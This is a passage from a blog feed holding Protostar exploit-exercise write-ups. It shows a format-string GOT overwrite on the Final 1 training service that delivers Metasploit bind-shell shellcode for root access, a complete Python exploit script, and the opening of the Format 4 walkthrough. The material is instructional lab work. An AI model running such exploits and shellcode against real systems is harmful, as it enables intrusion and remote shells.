+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 23:27:12 protostar final1: Login from 127.0.0.1:36770 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010804a11c804a11d804a11e804a11f] with password [B]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Towards the end, you can see all the memory addresses being written out.&lt;/p&gt;
+
+&lt;p&gt;The next logical step would be to replace the &amp;ldquo;%x&amp;rdquo; with &amp;ldquo;%n&amp;rdquo;, and watch the program crash, as we try to write arbitrary values to the &amp;ldquo;syslog()&amp;rdquo; memory space before it gets called.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 23:30:50 protostar final1: Login from 127.0.0.1:36772 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is not at all what I was expecting!  No crash, it tried to do the login.  But wait!  If I tried to continue sending commands in that same session, it seemed to have been messed up, since it does not even function properly, outputting the &amp;ldquo;[final1] $&amp;rdquo; string:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[final1] $ username A
+login B
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured that maybe I had crashed it, and a core had been dumped.  But nothing appeared:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ls /tmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I started tinkering, and decided to try having it login a second time, repeating the &amp;ldquo;login&amp;rdquo; command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\nlogin TEST2\n&amp;quot;&#39; | nc localhost 2994
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  4 23:37:49 protostar final1: Login from 127.0.0.1:36773 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
+Feb  4 23:37:49 protostar kernel: [984582.054370] final1[24813]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There we go, we have a segfault, which should have dumped a core for us to debug.  This is convenient, since if the overwrite of &amp;ldquo;syslog()&amp;rdquo; doesn&amp;rsquo;t happen until the second login attempt, we&amp;rsquo;ll need to know where &amp;ldquo;TEST2&amp;rdquo; was in memory, to inject shellcode.  NOTE: To debug in gdb, you will have to use the root login.  Per &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;http://exploit-exercises.com/protostar&lt;/a&gt; &amp;ldquo;For debugging the final levels, you can log in as root with password &amp;ldquo;godmode&amp;rdquo; (without the quotes)&amp;ldquo;.&lt;/p&gt;
+
+&lt;p&gt;This also made me remember, that since we are going to put shellcode in where &amp;ldquo;TEST2&amp;rdquo; is, the stack address will change, since the shellcode will probably be more than 5 characters long.  So this needs to be done again with a proper length shellcode.  That means the first step towards getting this, should be generating some shellcode.  I connected to a machine with the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; installed, and generated some:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfpayload linux/x86/shell_bind_tcp c
+/*
+* linux/x86/shell_bind_tcp - 78 bytes
+* http://www.metasploit.com
+* VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
+* PrependSetreuid=false, PrependSetuid=false,
+* PrependChrootBreak=false, AppendExit=false,
+* InitialAutoRunScript=, AutoRunScript=
+*/
+unsigned char buf[] =
+&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
+&amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
+&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
+&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
+&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
+&amp;quot;\x0b\xcd\x80&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wired up a new string to send to the program, using the username of the exploit format string for the first username, and a &amp;ldquo;B&amp;rdquo; for the password.  The second login attempt would set the username to &amp;ldquo;X&amp;rdquo;, as to not trigger the format string again, and a password containing a fake shellcode, of 78 &amp;ldquo;A&amp;rdquo;s.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin &amp;quot;.&amp;quot;B&amp;quot;x120 .&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  5 00:03:58 protostar final1: Login from 127.0.0.1:36775 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [Busername X]
+Feb  5 00:03:58 protostar kernel: [986148.949635] final1[24854]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to debug as root, to find the start of the shellcode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
+Password:
+root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24854
+Core was generated by `/opt/protostar/bin/final1&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0x30303030 in ?? ()
+(gdb) x/10s $esp
+0xbffff9fc:      &amp;quot;\357\230\004\b\017&amp;quot;
+0xbffffa02:      &amp;quot;&amp;quot;
+0xbffffa03:      &amp;quot;&amp;quot;
+0xbffffa04:      &amp;quot; \372\377\277\344\236\004\b\240\242\004\b \242\004\bF\374\377\277\364\177\375\267\230\372\377\277Login from 127.0.0.1:36775 as [X\034\241\004\b\035\241\004\b\036\241\004\b\037\241\004\b%15$n%16$n%17$n%18$n] with password [&amp;quot;, &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
+0xbffffac6:      &amp;quot;\377\277(\033\376\267\021&amp;quot;
+0xbfffface:      &amp;quot;&amp;quot;
+0xbffffacf:      &amp;quot;&amp;quot;
+0xbffffad0:      &amp;quot;\024\310\351\267\374\032\376\267\021{\234|\001&amp;quot;
+0xbffffade:      &amp;quot;&amp;quot;
+0xbffffadf:      &amp;quot;&amp;quot;
+(gdb) x/1s 0xbffffac6-81
+0xbffffa75:      &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now we know that we should be able to overwrite 0x0804a11c with 0xbffffa75 to make &amp;ldquo;syslog()&amp;rdquo; call our shellcode.  We just need to calculate the buffer lengths to get &amp;ldquo;0xbrffffa75&amp;rdquo; to actually show up instead of &amp;ldquo;0x30303030&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) p 0x75 - 0x30
+$1 = 69
+(gdb) p 0xfa - 0x75
+$2 = 133
+(gdb) p 0xff - 0xfa
+$3 = 5
+(gdb) p 0x1ff - 0xfa
+$4 = 261
+(gdb) p 0xbf - 0xff
+$5 = -64
+(gdb) p 0x1bf - 0xff
+$6 = 192
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This tells us, that with our 4 &amp;ldquo;%n&amp;rdquo;s, we should be able to use buffer lengths of 69, 133, 261, and 192.  So let&amp;rsquo;s wire that up:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  5 00:14:14 protostar final1: Login from 127.0.0.1:36776 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                              8049ee4                                                                                                                              804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
+Feb  5 00:14:14 protostar kernel: [986763.710440] final1[24875]: segfault at 69 ip bffffa78 sp bffffa00 error 6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we launch gdb again, we can see where it crashed, and cross our fingers that it was when trying to execute our fake shellcode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
+Password:
+root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24875
+Core was generated by `/opt/protostar/bin/final1&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0xbffffa78 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It would appear that our assumption was correct.  It tried to run starting at 0xbffffa75, and made it to 0xbffffa78 before segfaulting.  Let&amp;rsquo;s now replace the fake shellcode with real shellcode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, this appeared to segfault as well, based on the syslog output, so again, I loaded it in gdb:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24894
+Core was generated by `/opt/protostar/bin/final1&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0xbffffa78 in ?? ()
+(gdb) x/1x 0x0804a11c
+0x804a11c:      0xbffffa75
+(gdb) x/1s 0xbffffa75
+0xbffffa75:      &amp;quot;$n] with password [1\333\367\343SCSj\002\211\341\260fÍ[^Rh\377\002\021\\j\020QP\211\341jfXÍ\211A\004\263\004\260fÍC\260fÍ\223Yj?XÍIy\370h//shh/bin\211\343PS\211\341\260\vÍ]\n&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First, I made sure that the address of the &amp;ldquo;syslog()&amp;rdquo; function in the GOT was overwritten by the correct address, which it was.  I then realized that the length was off, since I changed the buffers to output the address.  This means the address would have to change, and the buffers as well again.  So I found the shellcode, and corrected the address:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) x/8x 0xbffffa75+19
+0xbffffa88:     0xe3f7db31      0x6a534353      0xb0e18902      0x5b80cd66
+0xbffffa98:     0xff68525e      0x6a5c1102      0x89505110      0x58666ae1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It now needs to jump to 0xbffffa88&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) p 0x88 - 0x30
+$1 = 88
+(gdb) p 0xfa - 0x88
+$2 = 114
+(gdb) p 0xff - 0xfa
+$3 = 5
+(gdb) p 0x1ff - 0xfa
+$4 = 261
+(gdb) p 0xbf - 0xff
+$5 = -64
+(gdb) p 0x1bf - 0xff
+$6 = 192
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So our new buffer offsets should be 88, 114, 261, and 192:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%88x%15\$n&amp;quot;.&amp;quot;%114x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
+[final1] $ [final1] $ login failed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the syslog, this showed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Feb  5 00:27:15 protostar final1: Login from 127.0.0.1:36781 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                                                 8049ee4                                                                                                           804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No segfault means maybe it worked.  Let&amp;rsquo;s attempt to connect on port 4444:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it, root access!  However, this only works on the local machine, since the syslog string contaisn your ip address and port that you used to connect.  This means that if you connect from outside hosts, the format string will be wrong.  I decided to fix this, by writing this out as a &amp;ldquo;true&amp;rdquo; exploit, instead of just a perl pipe.  This was both for fun, and to try getting better at writing actual &amp;ldquo;exploits&amp;rdquo; that I could publish.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+
+# Protostar Final 1 Exploit
+# http://exploit-exercises.com/protostar/final1
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from socket import *
+from struct import *
+from optparse import OptionParser
+
+def exploit(host, port):
+    syslog_address = 0x0804a11c
+    syslog_address_1 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address)
+    syslog_address_2 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 1)
+    syslog_address_3 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 2)
+    syslog_address_4 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 3)
+
+    # linux/x86/shell_bind_tcp - 78 bytes
+    # http://www.metasploit.com
+    # VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
+    # PrependSetreuid=false, PrependSetuid=false,
+    # PrependChrootBreak=false, AppendExit=false,
+    # InitialAutoRunScript=, AutoRunScript=
+    shellcode = &amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot; \
+                &amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot; \
+                &amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot; \
+                &amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot; \
+                &amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot; \
+                &amp;quot;\x0b\xcd\x80&amp;quot;
+
+    # Open the connection
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((host, port))
+
+    # Because the string in the syslog varies, due to it showing &amp;quot;Login from 192.168.1.1:19661&amp;quot; for example
+    # Calculate length of junk filler, based on max ip+port combo being 255.255.255.255:65535
+    # Write out 0xbffffc46 (start of shellcode) to 0x0804a11c (GOT of syslog)
+    source_address = s.getsockname()[0]
+    source_port = s.getsockname()[1]
+    source_string = str(source_address) + &amp;quot;:&amp;quot; + str(source_port)
+
+    junk_buffer_length = 21 - len(source_string)
+
+    print(&amp;quot;[*] Sending format string as username&amp;quot;)
+    s.send(&amp;quot;username XXX&amp;quot; + &amp;quot;X&amp;quot;*junk_buffer_length + syslog_address_1 + syslog_address_2 + syslog_address_3 + syslog_address_4 + &amp;quot;%14x%17$n&amp;quot; + &amp;quot;%182x%18$n&amp;quot; + &amp;quot;%259x%19$n&amp;quot; + &amp;quot;%192x%20$n&amp;quot; + &amp;quot;\n&amp;quot;)
+
+    print(&amp;quot;[*] Sending password to trigger formatstring&amp;quot;)
+    s.send(&amp;quot;login &amp;quot; + &amp;quot;B&amp;quot; + &amp;quot;\n&amp;quot;)
+
+    print(&amp;quot;[*] Sending new username without format string&amp;quot;)
+    s.send(&amp;quot;username X\n&amp;quot;)
+
+    print(&amp;quot;[*] Sending shellcode as password&amp;quot;)
+    s.send(&amp;quot;login &amp;quot; + shellcode + &amp;quot;\n&amp;quot;)
+
+    s.close
+
+    print(&amp;quot;[*] Exploit successfull! Now launch: nc &amp;quot; + str(host) + &amp;quot; 4444&amp;quot;)
+    
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to exploit&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2994, type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+    
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Format 4</title>
+      <link>https://www.mattandreko.com/blog/2012-02-02-exploit-exercises-protostar-format-4/</link>
+      <pubDate>Thu, 02 Feb 2012 05:15:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-02-exploit-exercises-protostar-format-4/</guid>
+      <description>&lt;p&gt;Next up is the last challenge in the Format String series, &lt;a href=&#34;http://exploit-exercises.com/protostar/format4&#34;&gt;Format 4&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out with the following code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+void hello()
+{
+ printf(&amp;quot;code execution redirected! you win\n&amp;quot;);
+ _exit(1);
+}
+
+void vuln()
+{
+ char buffer[512];
+
+ fgets(buffer, sizeof(buffer), stdin);
+
+ printf(buffer);
+
+ exit(1); 
+}
+
+int main(int argc, char **argv)
+{
+ vuln();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What initially caught my eye was the fact that there was a call to &amp;ldquo;exit()&amp;rdquo; as well as &amp;ldquo;_exit()&amp;ldquo;.  This made me think back to my reading, and I realized it was going to be a GOT (Global Offset Table) overwrite on &amp;ldquo;exit()&amp;rdquo;.  When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions.  The first time it runs that function, it will cache the memory address in the GOT, so that it doesn&amp;rsquo;t have to ask libc, or the corresponding library each time.  If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.  In this case, our victim is &amp;ldquo;exit()&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;For this exploit to work, we will need a few things:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Memory address of &amp;ldquo;exit()&amp;rdquo; in the GOT, which we want to overwrite&lt;/li&gt;
+&lt;li&gt;Memory address of &amp;ldquo;hello()&amp;rdquo;, which will be the data we overwrite the GOT with&lt;/li&gt;
+&lt;li&gt;Stack offset for the format string&lt;/li&gt;
+&lt;li&gt;The amount of characters to buffer for each byte-pair&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Getting the memory address of the &amp;ldquo;exit()&amp;rdquo; method in the GOT is fairly easy:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R format4
+
+format4:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080496fc R_386_GLOB_DAT    __gmon_start__
+08049730 R_386_COPY        stdin
+0804970c R_386_JUMP_SLOT   __gmon_start__
+08049710 R_386_JUMP_SLOT   fgets
+08049714 R_386_JUMP_SLOT   __libc_start_main
+08049718 R_386_JUMP_SLOT   _exit
+0804971c R_386_JUMP_SLOT   printf
+08049720 R_386_JUMP_SLOT   puts
+08049724 R_386_JUMP_SLOT   exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Getting the memory address of &amp;ldquo;hello()&amp;rdquo; is quite similar:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format4 | grep hello
+080484b4 g     F .text  0000001e              hello
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To get the stack offset of the format string, it&amp;rsquo;s quite simple.  We&amp;rsquo;ve done it in prior challenges.  Let&amp;rsquo;s just spam &amp;ldquo;%x&amp;rdquo;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo AAAAAAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x15&#39;` | ./format4
+AAAAAAAA200.b7fd8420.bffff624.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From this, we can now see &amp;ldquo;41414141&amp;rdquo; in the 4th stack variable, so our offset is 4.&lt;/p&gt;
+
+&lt;p&gt;Using that offset of 4, we can now generate a format string using Direct Parameter Access, which I&amp;rsquo;ve only slightly mentioned in previous posts. I chose to dump the string to a file, because it made it really easy to use with gdb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;\x24\x97\x04\x08&amp;quot;.&amp;quot;\x25\x97\x04\x08&amp;quot;.&amp;quot;\x26\x97\x04\x08&amp;quot;.&amp;quot;\x27\x97\x04\x08&amp;quot;.&amp;quot;%4\$n&amp;quot;&#39; &amp;gt; /home/user/format4_dpa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, if we run it in gdb, we can see how many characters are being written to &amp;ldquo;printf&amp;rdquo; initially, and adjust our buffering to compensate.  Start up the gdb debugger, and disassemble the &amp;ldquo;vuln&amp;rdquo; function.  We do this, so we can set a breakpoint right before &amp;ldquo;exit()&amp;rdquo; gets called.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb --quiet ./format4
+Reading symbols from /opt/protostar/bin/format4...done.
+(gdb) disassemble vuln
+Dump of assembler code for function vuln:
+0x080484d2 &amp;lt;vuln+0&amp;gt;:    push   %ebp
+0x080484d3 &amp;lt;vuln+1&amp;gt;:    mov    %esp,%ebp
+0x080484d5 &amp;lt;vuln+3&amp;gt;:    sub    $0x218,%esp
+0x080484db &amp;lt;vuln+9&amp;gt;:    mov    0x8049730,%eax
+0x080484e0 &amp;lt;vuln+14&amp;gt;:   mov    %eax,0x8(%esp)
+0x080484e4 &amp;lt;vuln+18&amp;gt;:   movl   $0x200,0x4(%esp)
+0x080484ec &amp;lt;vuln+26&amp;gt;:   lea    -0x208(%ebp),%eax
+0x080484f2 &amp;lt;vuln+32&amp;gt;:   mov    %eax,(%esp)
+0x080484f5 &amp;lt;vuln+35&amp;gt;:   call   0x804839c &amp;lt;fgets@plt&amp;gt;
+0x080484fa &amp;lt;vuln+40&amp;gt;:   lea    -0x208(%ebp),%eax
+0x08048500 &amp;lt;vuln+46&amp;gt;:   mov    %eax,(%esp)
+0x08048503 &amp;lt;vuln+49&amp;gt;:   call   0x80483cc &amp;lt;printf@plt&amp;gt;
+0x08048508 &amp;lt;vuln+54&amp;gt;:   movl   $0x1,(%esp)
+0x0804850f &amp;lt;vuln+61&amp;gt;:   call   0x80483ec &amp;lt;exit@plt&amp;gt;
+End of assembler dump.
+(gdb) b *vuln+61
+Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After the breakpoint has been set, go ahead and run the program, piping in the formatstring from the file we created earlier:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) run &amp;lt; /home/user/format4_dpa
+Starting program: /opt/protostar/bin/format4 &amp;lt; /home/user/format4_dpa
+
+Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
+22      format4/format4.c: No such file or directory.
+        in format4/format4.c
+&lt;/code&gt;&lt;/pre&gt;
+
